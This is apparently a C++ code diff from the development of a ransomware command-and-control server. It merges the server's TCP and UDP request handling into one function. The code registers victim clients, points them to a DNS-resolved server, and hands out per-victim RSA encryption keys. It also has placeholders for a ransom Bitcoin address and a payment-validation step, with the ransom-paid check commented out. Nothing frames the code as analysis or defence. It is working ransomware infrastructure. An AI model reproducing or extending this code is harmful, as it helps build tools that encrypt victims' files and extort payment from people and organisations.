@@ -68,7 +68,7 @@ void ServerInterface::ListenForUDPMessages() {
 			continue;
 
 		std::cout << "Received a message on the UDP socket." << std::endl;
-		PerformUDPRequest(req, incomingAddr);
+		PerformRequest(req, this->UDPServerDetails, -1, incomingAddr);
 	}
 	std::cout << "Not receiving\n";
 }
@@ -95,34 +95,69 @@ void ServerInterface::ShutdownServer(BOOL confirm) {
 	this->TCPServerDetails = {}; // set server details to new blank server structure
 }
 
-BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
-	BOOL		  success = FALSE;
-	Client*		  client  = GetClientPtr(cuid); // client who made the request
-	ServerCommand responseCommand;
+BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, sockaddr_in incoming) {
+	if ( !req.valid ) 
+		return FALSE;
+	
+	BOOL    success = FALSE;
+	BOOL    onTCP   = ( on.type == SOCK_STREAM ); // TRUE = performing on tcp server, FALSE = performing on udp
+	Client* TCPClient = nullptr;
 
-	if ( !ClientIsInClientList(cuid) )
-		return success;
+	if ( onTCP ) 
+		TCPClient = GetClientPtr(cuid);
 
-	switch ( req.action ) {
-	case ClientMessage::REQUEST_PRIVATE_ENCRYPTION_KEY:
+	switch ( req.action )
+	{
+	// connect client to tcp server on udp request
+	case ClientRequest::CONNECT_CLIENT: 
+	{
+		if ( onTCP ) // already connected
+			break;
+
+		Client UDPClient( req.tcp, req.udp, incoming );
+
+		// client wants to connect so respond with tcp server details
+		hostent* host = GetHostByName(DNS_NAME.c_str());
+
+		// server with ip inserted into addr for the client to connect to
+		// allows me to change the dns name to whatever i want, whenever
+		Server temp = this->TCPServerDetails;
+		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);
+
+		UDPMessage response(temp);
+		if ( UDPSendMessageToClient(UDPClient, response) )
+			success = TRUE;
+
+		break;
+	}
+	case ClientMessage::REQUEST_PRIVATE_ENCRYPTION_KEY: 
+	{
+		// tcp only command
+		if ( !onTCP ) 
+			break;
+
 		//if ( !IsRansomPaid(client) ) {
 		//	success = FALSE;
 		//	break;
 		//}
 
-		responseCommand.action = RemoteAction::RETURN_PRIVATE_RSA_KEY;
-		//responseCommand.publicEncryptionKey = NetCommon::ConvertBIOToString(client.RSAPublicKey);
-		responseCommand.privateEncryptionKey = client->GetSecrets().strPrivateKey;
-		success = TCPSendMessageToClient(cuid, responseCommand);
-		std::cout << "sending\n";
+		ServerCommand reply(RemoteAction::RETURN_PRIVATE_RSA_KEY, {}, "", "", TCPClient->GetSecrets().strPrivateKey);
+		success = TCPSendMessageToClient(cuid, reply);
 
 		break;
+	}
 	case ClientMessage::REQUEST_PUBLIC_ENCRYPTION_KEY:
-		SendTCPClientRSAPublicKey(cuid, client->GetSecrets().bioPublicKey);
+		if ( !onTCP )
+			break;
+		success = SendTCPClientRSAPublicKey(cuid, TCPClient->GetSecrets().bioPublicKey);
 		break;
 	case ClientMessage::REQUEST_RANSOM_BTC_ADDRESS:
+		if ( !onTCP )
+			break;
 		break;
 	case ClientMessage::VALIDATE_RANSOM_PAYMENT:
+		if ( !onTCP )
+			break;
 		break;
 	}
 }
@@ -139,7 +174,7 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 	// initial request to send rsa keys
 	{
 		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP));
-		PerformTCPRequest(receivedData, cuid);
+		PerformRequest(receivedData, this->TCPServerDetails, cuid);
 	}
 
 	// tcp receive main loop
@@ -164,7 +199,7 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 
 		std::cout << "Client name: " << client->ComputerName << std::endl;
 
-		PerformTCPRequest(receivedData, cuid);
+		PerformRequest(receivedData, this->TCPServerDetails, cuid);
 	} 
 	while ( receiving );
 }
@@ -258,7 +293,7 @@ Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
 	
 	server.addr.sin_addr.s_addr = INADDR_ANY;
 	server.addr.sin_family	    = AF_INET;
-	server.addr.sin_port        = htons(port);
+	server.addr.sin_port        = HostToNetworkShort(port);
 	server.port                 = port;
 	server.alive = TRUE;
 
@@ -325,42 +360,7 @@ ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
 }
 
 BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& message) {
-	message.isValid = TRUE;
 	return NetCommon::TransmitData(message, this->UDPServerDetails.sfd, UDP, clientInfo.GetAddressInfo());
-}
-
-BOOL ServerInterface::PerformUDPRequest(ClientMessage req, sockaddr_in incomingAddr) {
-	BOOL success = FALSE;
-	
-	// udp isnt encrypted, which is why we want to get out of udp as fast as possible
-	// only serialized as a bytestring to send over sockets
-	if ( !req.valid )
-		return FALSE;
-
-	std::cout << "Performing UDP request. Action: " << req.action << std::endl;
-
-	switch ( req.action ) {
-	case ClientMessage::CONNECT_CLIENT:	
-		Client client(req.tcp, req.udp, incomingAddr);
-
-		std::cout << "Client UDP socket: " << client.GetSocket(UDP) << std::endl;
-
-		// client wants to connect so respond with tcp server details
-		hostent* host = GetHostByName(DNS_NAME.c_str());
-
-		Server temp = this->TCPServerDetails;
-		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);
-
-		UDPMessage response = {};
-		response.isValid = TRUE;
-		response.TCPServer = temp;
-
-		if ( UDPSendMessageToClient(client, response) )
-			success = TRUE;
-		break;
-	}
-
-	return success;
 }
 
 Client* ServerInterface::GetClientPtr(long cuid) {
@@ -418,23 +418,3 @@ BOOL ServerInterface::AddToClientList(Client client) {
 	
 	return TRUE;
 }
-
-//template <typename Data>
-//Data ServerInterface::DecryptClientData(BYTESTRING cipher, long cuid) {
-//	if ( !ClientIsInClientList(cuid) )
-//		return {};
-//
-//	ClientData  clientInfo    = GetClientData(cuid);
-//	BIO*        decryptionKey = clientInfo.second.first;
-//	Data        decrypted     = NetCommon::DecryptInternetData<Data>(cipher, decryptionKey);
-//	
-//	return decrypted;
-//}
-//
-//ClientRequest ServerInterface::DecryptClientRequest(long cuid, BYTESTRING req) {
-//	return DecryptClientData<ClientRequest>(req, cuid); // return decrypted clientRequest struct
-//}
-//
-//ClientResponse ServerInterface::DecryptClientResponse(long cuid, BYTESTRING resp) {
-//	return DecryptClientData<ClientResponse>(resp, cuid);
-//}
